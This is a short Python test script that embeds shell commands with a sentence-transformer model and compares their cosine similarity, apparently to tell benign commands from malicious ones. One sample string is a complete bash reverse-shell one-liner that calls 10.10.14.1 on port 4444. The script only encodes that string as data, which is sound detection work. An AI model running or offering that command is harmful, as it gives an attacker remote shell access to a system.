from sentence_transformers import SentenceTransformer
from sklearn.metrics.pairwise import cosine_similarity
model = SentenceTransformer('command-encoder')

# Тест
cmd1 = model.encode("whoami")
cmd2 = model.encode("id")
cmd3 = model.encode("bash -i >& /dev/tcp/10.10.14.1/4444 0>&1")

print("whoami <-> id:", cosine_similarity([cmd1], [cmd2])[0][0])
print("whoami <-> rev shell:", cosine_similarity([cmd1], [cmd3])[0][0])